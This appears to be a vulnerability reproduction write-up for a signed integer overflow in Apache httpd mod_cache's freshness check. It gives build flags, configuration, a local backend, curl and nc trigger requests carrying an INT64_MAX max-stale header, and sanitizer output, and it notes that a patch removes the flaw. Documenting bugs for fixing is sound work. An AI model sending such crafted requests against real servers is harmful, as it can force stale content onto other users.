# 025 — Signed overflow in cache freshness arithmetic

`cache_check_freshness()` at `modules/cache/cache_util.c:722` evaluates
`age < (maxage + maxstale - minfresh)` in signed `apr_int64_t`. A
client-supplied `Cache-Control: max-stale=<huge>` overflows when the cached
object has any positive `max-age`, which is undefined behavior in C.

## Setup

Build httpd with mod_cache and a UBSan-instrumented binary so the overflow
is observable:

```bash
CFLAGS='-O0 -g -fsanitize=signed-integer-overflow,undefined' \
LDFLAGS='-fsanitize=undefined' \
./configure --prefix=$PWD/inst \
    --enable-cache --enable-cache-disk --enable-proxy --enable-proxy-http
make -j && make install
```

`httpd.conf` snippet:

```apache
LoadModule cache_module       modules/mod_cache.so
LoadModule cache_disk_module  modules/mod_cache_disk.so
LoadModule proxy_module       modules/mod_proxy.so
LoadModule proxy_http_module  modules/mod_proxy_http.so

CacheRoot   "/tmp/cache"
CacheEnable disk "/"
CacheLock   on
CacheQuickHandler on

ProxyPass        /  http://127.0.0.1:9000/
ProxyPassReverse /  http://127.0.0.1:9000/
```

Backend with a positive freshness lifetime:

```bash
mkdir -p /tmp/cache
python3 - <<'PY' &
from http.server import BaseHTTPRequestHandler, HTTPServer
class H(BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200)
        self.send_header('Cache-Control','max-age=60')
        self.send_header('Content-Type','text/plain')
        self.end_headers()
        self.wfile.write(b'hello\n')
HTTPServer(('127.0.0.1',9000), H).serve_forever()
PY
```

Prime the cache:

```bash
curl -s http://127.0.0.1:8080/obj > /dev/null
sleep 2     # ensure age > 0
```

## Trigger

Send a request whose `max-stale` is `INT64_MAX`:

```bash
curl -v http://127.0.0.1:8080/obj \
  -H 'Cache-Control: max-stale=9223372036854775807'
```

Equivalent raw form for use against a non-curl client:

```bash
python3 -c "import sys; sys.stdout.buffer.write(
    b'GET /obj HTTP/1.1\r\nHost: x\r\n'
    b'Cache-Control: max-stale=9223372036854775807\r\n\r\n')" \
  | nc 127.0.0.1 8080
```

## Observed effect

UBSan runtime report on stderr / `error.log`:

```text
cache_util.c:722:18: runtime error: signed integer overflow:
60 + 9223372036854775807 cannot be represented in type 'long'
```

Without UBSan the optimizer-dependent outcome is observable as a freshness
classification flip. With the same cached object, contrast:

```bash
curl -sD- -o/dev/null http://127.0.0.1:8080/obj \
  -H 'Cache-Control: max-stale=0'
# X-Cache: REVALIDATE/HIT or MISS — depends on age vs maxage

curl -sD- -o/dev/null http://127.0.0.1:8080/obj \
  -H 'Cache-Control: max-stale=9223372036854775807'
# X-Cache: HIT regardless of age, even when origin is stopped
```

After the patch, the overflow path is gone (`cache_freshness_lifetime_is_fresh`
uses unsigned arithmetic) and UBSan is silent.
